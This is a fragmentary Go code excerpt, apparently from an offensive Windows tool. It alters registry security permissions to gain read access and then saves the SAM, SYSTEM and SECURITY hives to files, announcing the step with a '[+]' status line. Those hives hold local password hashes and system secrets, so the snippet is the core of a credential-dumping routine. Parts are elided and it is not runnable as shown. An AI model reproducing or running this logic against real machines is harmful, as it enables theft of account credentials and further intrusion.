...
var (
	...
	hives     []string = []string{"SAM", "SYSTEM", "SECURITY"}
...
func execute() {
	...
	var oldentries []windows.EXPLICIT_ACCESS = getsecreadpermission()

	fmt.Println("[+] Saving the SAM, SYSTEM, and SECURITY hives")
	for i, h := range hives {
		outfile := filenames[i]
		savehive(h, outfile)
	}
